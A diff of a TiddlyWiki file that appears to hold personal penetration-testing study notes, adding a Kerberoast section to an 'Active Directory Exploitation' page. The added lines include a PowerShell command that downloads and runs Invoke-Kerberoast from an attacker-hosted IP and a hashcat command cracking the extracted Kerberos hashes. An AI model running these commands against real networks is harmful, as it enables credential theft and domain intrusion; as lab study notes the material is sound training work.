@@ -10123,7 +10123,7 @@ OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE." />
 <div created="20211224142936076" modified="20211224142936076" title="$:/state/toc/TableOfContents/Tech-Operations/IT--118161433">
 <pre>open</pre>
 </div>
-<div created="20211224141359734" list="[[Penetration Testing]] [[Client Side Exploitation]]" modified="20211225000402666" title="$:/StoryList">
+<div created="20211224141359734" list="[[Penetration Testing]] [[Post Exploitation]] [[Active Directory Exploitation]]" modified="20211225000914501" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -11114,7 +11114,7 @@ http://marlinfw.org/docs/gcode/M302.html
 # [[Project Work]]
 # [[Economics|https://drive.google.com/open?id=1TPLzZ9AZ3WjlCvFcmPdK7OZKEtZ4KUGT]]</pre>
 </div>
-<div created="20211209113521474" modified="20211225000325729" title="Active Directory Exploitation" type="text/x-markdown">
+<div created="20211209113521474" modified="20211225002441630" title="Active Directory Exploitation" type="text/x-markdown">
 <pre>https://attack.stealthbits.com/how-golden-ticket-attack-works
 
 
@@ -11146,7 +11146,20 @@ https://tryhackme.com/room/postexploit
 
 https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux
 
+
 # 2. Authentication
+
+## Kerberoast
+
+https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/
+
+    PS C:\docs&gt; IEX(New-Object Net.WebClient).downloadString('http://192.168.119.172:8000/Invoke-Kerberoast.ps1')
+    PS C:\docs&gt; Invoke-Kerberoast  -OutputFormat Hashcat
+
+
+Cracking the Hash
+
+    hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt
 
 ## Silver Ticket
 
